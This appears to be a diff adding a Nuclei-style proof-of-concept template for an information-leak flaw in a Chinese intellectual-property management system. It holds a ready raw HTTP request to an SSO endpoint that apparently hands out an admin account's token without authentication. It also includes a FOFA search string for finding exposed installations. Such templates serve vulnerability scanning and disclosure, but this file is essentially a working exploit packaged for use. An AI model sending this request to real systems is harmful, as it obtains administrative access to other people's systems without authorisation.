@@ -1,0 +1,29 @@
+id: poc-uo7g9xfc3gb7o114
+info:
+  name: 智慧芽知识产权信息管理系统 get_token_by_account 存在信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/uo7g9xfc3gb7o114'
+  tags: info-leak,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: uo7g9xfc3gb7o114
+    fofa: '"/innoe-web"'
+http:
+- raw:
+  - 'GET /innoe-passport/sso/get_token_by_account?account=admin HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate, br
+
+    Connection: keep-alive
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
